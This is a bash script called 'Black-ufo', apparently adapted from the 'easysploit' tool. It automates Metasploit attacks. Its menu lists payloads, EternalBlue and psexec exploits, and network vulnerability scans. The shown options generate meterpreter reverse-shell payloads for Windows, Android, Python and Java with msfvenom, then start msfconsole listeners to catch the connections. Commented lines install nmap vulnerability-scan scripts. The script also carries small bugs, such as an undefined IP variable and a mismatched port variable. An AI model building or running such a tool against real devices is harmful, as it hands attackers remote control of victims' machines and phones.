#!/bin/bash
#Black-ufo


#YOUR CODE IS MINES!
#https://github.com/KALILINUXTRICKSYT/easysploit/blob/master/easysploit


#nmap script
#git clone https://github.com/scipag/vulscan scipag_vulscan
#ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan
#run script
#nmap -sV --script=vulscan/vulscan.nse $TARGET

#nmap 2 script
#cd /usr/share/nmap/scripts/
#git clone https://github.com/vulnersCom/nmap-vulners.git
#nmap --script nmap-vulners -sV $TARGET

#made by: Oak atsume
ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
#sniper
sp="/-\|"
sc=0
spin() {
   printf "\b${sp:sc++:1}"
   ((sc==${#sp})) && sc=0
}
endspin() {
   printf "\r%s\n" "$@"
}
#spiner-end

underline=`tput smul`
nounderline=`tput rmul`
bold=`tput bold`
normal=`tput sgr0`

FILE="exec1"
name="Black-ufo"
username=$(whoami)

filename="Framework"
bad="[×] "
good="[√] "
#color
red=$'\e[1;31m'
grn=$'\e[1;32m'
yel=$'\e[1;33m'
blu=$'\e[1;34m'
mag=$'\e[1;35m'
cyn=$'\e[1;36m'
end=$'\e[0m'

function c-blue(){
        printf $blu
}

function c-red(){
        printf $red
}

function c-reset(){
        printf $end
}

function c-yel() {
        printf $yel
}
function c-mag() {
        printf $mag
}


if [ -f $FILE ]; then
   echo "$bad please use the other Black-ufo!"
   exit 0
else

   echo "$good Black-ufo"
if [ -f $filename ]; then
  echo "$good $filename found!"
  else
  echo "$bad $filename not found!"
fi
fi
echo "Name for the payloads"
read -p "PAYLOAD-NAME: " name
clear

echo -e "Welcome \n your ip is \n IP: $LIP"

read -p "${underline}msf0>${normal} " msf0

#options list
if [ $msf0 == "list" ];
then
c-mag
echo "

(1) Windows --> $name.exe (payload and listener)
(2) Android --> $name.apk (payload and listener)
(3) Linux --> $name.py (payload and listener)
(4) MacOS --> $name.jar (payload and listener)
(5) Web -->  $name.php (payload and listener)
(6) Scan if a target is vulnerable to ms17_010
(7) Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)
(8) Enable Remote Desktop (ms17_010_eternalblue)
(9) Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec)
(10) Enable Remote Desktop (ms17_010_psexec)
(11) Exploit Windows with a link (HTA Server)
(12) Scan for vulnerable Devices (network range)
(13) Scan for vulnerable Device (Single target)
"
c-reset
echo "$msf0 command found!"

fi

#more

if [ $msf0 == "1" ];
then

read -p "LPORT: " port

echo "Payload: /output/$name.exe"

        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > output/$name.exe

echo "Starting lisener"

        msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set LHOST $ip ; set LPORT $port ; run -j ;"

fi


if [ $msf0 == "2" ];
then

read -p "LPORT: " port

echo " Payload: /output/$name.apk "
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port  > output/$name.apk

echo "Starting lisener"

        msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set LHOST $ip ; set LPORT $port ; run -j ;"
fi

if [ $msf0 == "3" ];
then

read -p "LPORT: " port

echo "Payload: /output/$name.py"

        msfvenom -p python/meterpreter/reverse_tcp LHOST=$ip LPORT=$port > output/$name.py

echo "Staring lisener"

        msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set LHOST $ip ; set LPORT $port ; run -j ;"

fi

if [ $msf0 == "4" ];
then

read -p "LPORT: " port

echo " Payload: /output/$name.jar "

        msfvenom -p java/meterpreter/reverse_tcp LHOST=$ip LPORT=$PORT -f jar > output/$name.jar

echo "Starting lisener"

        msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set LHOST $ip ; set LPORT $port ; run -j ;"

fi

#OwO

#IF THE IMPUT IS EMPTY
